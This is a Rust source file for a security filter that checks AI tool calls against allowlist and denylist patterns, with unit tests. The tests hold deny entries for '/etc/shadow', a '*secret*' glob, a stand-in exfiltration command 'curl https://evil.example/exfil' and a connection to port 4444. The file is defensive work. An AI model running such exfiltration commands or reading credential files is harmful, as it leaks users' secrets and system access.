// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Allowlist and denylist filter for path and command patterns.

use crate::filters::{FilterPhase, SecurityFilter};
use crate::types::{FilterResult, Severity, ToolCallContext};
use serde::{Deserialize, Serialize};

/// An entry in the allowlist or denylist.
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct ListEntry {
    pub pattern: String,
    #[serde(default)]
    pub plugins: Vec<String>,
}

/// Configuration for the allowlist filter.
#[derive(Debug, Clone, Deserialize, Serialize, Default)]
pub struct AllowlistConfig {
    #[serde(default)]
    pub allow: Vec<ListEntry>,
    #[serde(default)]
    pub deny: Vec<ListEntry>,
}

/// Filter that checks paths against user-defined allowlists and denylists.
///
/// Denylist entries add score (+3.0), allowlist entries reduce score (-1.0).
/// Denylist is evaluated first — an explicit deny always wins.
pub struct AllowlistFilter {
    config: AllowlistConfig,
}

impl AllowlistFilter {
    pub fn new(config: AllowlistConfig) -> Self {
        Self { config }
    }
}

#[async_trait::async_trait]
impl SecurityFilter for AllowlistFilter {
    fn name(&self) -> &str {
        "allowlist"
    }

    fn phase(&self) -> FilterPhase {
        FilterPhase::Static
    }

    async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
        let full_command = ctx.full_command();
        let net_target = ctx.address().map(|(addr, port)| format!("{addr}:{port}"));
        let target = ctx
            .path()
            .or_else(|| ctx.url())
            .or(full_command.as_deref())
            .or(net_target.as_deref())
            .unwrap_or("");

        // Check denylist first — explicit blocks
        for entry in &self.config.deny {
            if path_matches(target, &entry.pattern)
                && plugin_matches(&ctx.plugin_id, &entry.plugins)
            {
                return Ok(FilterResult::matched(
                    "allowlist",
                    "deny-list",
                    3.0,
                    Severity::Error,
                    format!("Path matches denylist: {}", entry.pattern),
                ));
            }
        }

        // Check allowlist — explicit allows reduce score
        for entry in &self.config.allow {
            if path_matches(target, &entry.pattern)
                && plugin_matches(&ctx.plugin_id, &entry.plugins)
            {
                return Ok(FilterResult::matched(
                    "allowlist",
                    "allow-list",
                    -1.0,
                    Severity::Notice,
                    format!("Path matches allowlist: {}", entry.pattern),
                ));
            }
        }

        Ok(FilterResult::no_match("allowlist"))
    }
}

/// Simple glob-like pattern matching supporting `*` prefix, suffix, and both.
fn path_matches(path: &str, pattern: &str) -> bool {
    if pattern == "*" {
        return true;
    }
    if let Some(suffix) = pattern.strip_prefix('*') {
        if let Some(middle) = suffix.strip_suffix('*') {
            return path.contains(middle);
        }
        return path.ends_with(suffix);
    }
    if let Some(prefix) = pattern.strip_suffix('*') {
        return path.starts_with(prefix);
    }
    // Exact match or path ends with the pattern (for bare filenames like ".env")
    path == pattern || path.ends_with(pattern)
}

/// Check if a plugin matches the plugin filter (empty = all plugins).
fn plugin_matches(plugin_id: &str, plugins: &[String]) -> bool {
    plugins.is_empty() || plugins.iter().any(|p| p == plugin_id || p == "*")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::ToolCallType;
    use uuid::Uuid;

    fn make_ctx(plugin: &str, call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new(plugin, call_type, Uuid::new_v4())
    }

    #[tokio::test]
    async fn test_denylist_match() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![],
            deny: vec![ListEntry {
                pattern: "/etc/shadow".into(),
                plugins: vec![],
            }],
        });
        let ctx = make_ctx(
            "test",
            ToolCallType::FileRead {
                path: "/etc/shadow".into(),
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "deny-list");
        assert_eq!(result.score, 3.0);
    }

    #[tokio::test]
    async fn test_allowlist_match() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![ListEntry {
                pattern: "/project/src/*".into(),
                plugins: vec![],
            }],
            deny: vec![],
        });
        let ctx = make_ctx(
            "test",
            ToolCallType::FileRead {
                path: "/project/src/main.rs".into(),
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "allow-list");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_deny_takes_precedence() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![ListEntry {
                pattern: "*".into(),
                plugins: vec![],
            }],
            deny: vec![ListEntry {
                pattern: "/etc/shadow".into(),
                plugins: vec![],
            }],
        });
        let ctx = make_ctx(
            "test",
            ToolCallType::FileRead {
                path: "/etc/shadow".into(),
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "deny-list");
    }

    #[tokio::test]
    async fn test_no_match() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![ListEntry {
                pattern: "/allowed/*".into(),
                plugins: vec![],
            }],
            deny: vec![ListEntry {
                pattern: "/denied/*".into(),
                plugins: vec![],
            }],
        });
        let ctx = make_ctx(
            "test",
            ToolCallType::FileRead {
                path: "/other/file.txt".into(),
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_plugin_scoping() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![],
            deny: vec![ListEntry {
                pattern: "/sensitive/*".into(),
                plugins: vec!["untrusted-plugin".into()],
            }],
        });

        // Untrusted plugin should be denied
        let ctx = make_ctx(
            "untrusted-plugin",
            ToolCallType::FileRead {
                path: "/sensitive/data".into(),
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);

        // Trusted plugin should pass through
        let ctx = make_ctx(
            "trusted-plugin",
            ToolCallType::FileRead {
                path: "/sensitive/data".into(),
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(!result.matched);
    }

    #[tokio::test]
    async fn test_wildcard_pattern() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![],
            deny: vec![ListEntry {
                pattern: "*secret*".into(),
                plugins: vec![],
            }],
        });
        let ctx = make_ctx(
            "test",
            ToolCallType::FileRead {
                path: "/app/my-secret-file.txt".into(),
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
    }

    #[tokio::test]
    async fn test_command_pattern_matches_shell_exec() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![],
            deny: vec![ListEntry {
                pattern: "curl https://evil.example/exfil".into(),
                plugins: vec![],
            }],
        });
        let ctx = make_ctx(
            "test",
            ToolCallType::ShellExec {
                command: "curl".into(),
                args: vec!["https://evil.example/exfil".into()],
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "deny-list");
    }

    #[tokio::test]
    async fn test_network_target_matches_net_connect() {
        let filter = AllowlistFilter::new(AllowlistConfig {
            allow: vec![],
            deny: vec![ListEntry {
                pattern: "198.51.100.10:4444".into(),
                plugins: vec![],
            }],
        });
        let ctx = make_ctx(
            "test",
            ToolCallType::NetConnect {
                address: "198.51.100.10".into(),
                port: 4444,
            },
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "deny-list");
    }

    #[test]
    fn test_path_matches_exact() {
        assert!(path_matches("/etc/shadow", "/etc/shadow"));
        assert!(!path_matches("/etc/passwd", "/etc/shadow"));
    }

    #[test]
    fn test_path_matches_prefix_glob() {
        assert!(path_matches("/project/src/main.rs", "/project/src/*"));
        assert!(!path_matches("/other/src/main.rs", "/project/src/*"));
    }

    #[test]
    fn test_path_matches_suffix_glob() {
        assert!(path_matches("/app/cert.pem", "*.pem"));
        assert!(!path_matches("/app/cert.txt", "*.pem"));
    }

    #[test]
    fn test_path_matches_contains_glob() {
        assert!(path_matches("/app/my-secret-file", "*secret*"));
        assert!(!path_matches("/app/my-public-file", "*secret*"));
    }
}
